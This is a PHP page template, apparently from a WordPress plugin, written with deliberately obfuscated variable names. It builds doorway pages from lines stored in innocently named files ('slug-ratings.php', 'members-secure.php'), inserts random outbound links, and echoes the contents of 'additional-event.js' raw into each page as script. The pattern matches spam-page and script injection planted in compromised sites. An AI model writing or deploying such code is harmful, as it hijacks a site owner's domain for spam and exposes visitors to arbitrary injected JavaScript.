<?php
$oeXMghHl = intval(get_query_var('pewnxtvb'));

if ($oeXMghHl < 1 || $oeXMghHl > 2798) return;
$nURfkJRc = file(plugin_dir_path(__FILE__).'slug-ratings.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$skCQEm21 = explode(';', $nURfkJRc[$oeXMghHl]);
if (count($skCQEm21) < 2) return;
$xkjzzU = $skCQEm21[0];
$ugziTlhz4  = $skCQEm21[1];
$r4CMZoknJD = $skCQEm21[2];
$ywWf4XU7  = $skCQEm21[3];
$upESjIF12 = $skCQEm21[4];
set_query_var('qibwaahtcl', $xkjzzU);

$kpnDpT4KTT = '';
$bpTKRjLF6 = plugin_dir_path(__FILE__).'members-secure.php';
if (is_file($bpTKRjLF6)) {
	$gbXMQ = file($bpTKRjLF6, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($gbXMQ);
	shuffle($gbXMQ);
	$nTkhi = mt_rand(2, 5);
	if (count($gbXMQ) > $nTkhi) {
		for ($auOw4u2R = 0; $auOw4u2R < $nTkhi; $auOw4u2R++) {
			$aw5ds0 = array_shift($gbXMQ);
			$kpnDpT4KTT .= '<p><a href="'.$aw5ds0.'">'.$aw5ds0.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $xkjzzU; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $ugziTlhz4 . "</p>\n";
				if (strlen($ywWf4XU7) > 0) echo "<p>" . $ywWf4XU7 . "</p>\n";
				if (strlen($r4CMZoknJD) > 0) echo "<p>" . $r4CMZoknJD . "</p>\n";
				if (strlen($upESjIF12) > 0) echo '<p><a href="#"><img src="'.$upESjIF12.'"></a>' . "</p>\n";
				echo $kpnDpT4KTT;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$bQMwiDK = plugin_dir_path(__FILE__) . 'additional-event.js';
if (is_file($bQMwiDK)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($bQMwiDK);
	echo '</script>';
}
get_footer();
?>
